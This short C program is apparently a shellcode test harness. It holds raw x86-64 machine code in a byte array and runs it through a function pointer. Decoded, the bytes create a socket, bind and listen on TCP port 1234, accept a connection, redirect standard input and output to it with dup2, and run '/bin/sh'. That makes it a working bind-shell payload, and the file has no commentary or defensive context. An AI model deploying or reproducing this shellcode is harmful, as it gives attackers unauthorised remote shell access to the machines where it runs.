#include <stdio.h>
#include <stdlib.h>

unsigned char code[] = \
"\x90\x48\x31\xc0\x48\x83\xc0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\xff\xc6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x66\x68\x04\xd2\x66\x6a\x02\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x48\x31\xc0\x48\x83\xc0\x31\x0f\x05\x48\x31\xc0\x48\x83\xc0\x32\x48\x31\xf6\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x2b\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc3\x48\x89\xdf\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main()
{
	int (*ret)() = (int(*)())code;
	ret();
}
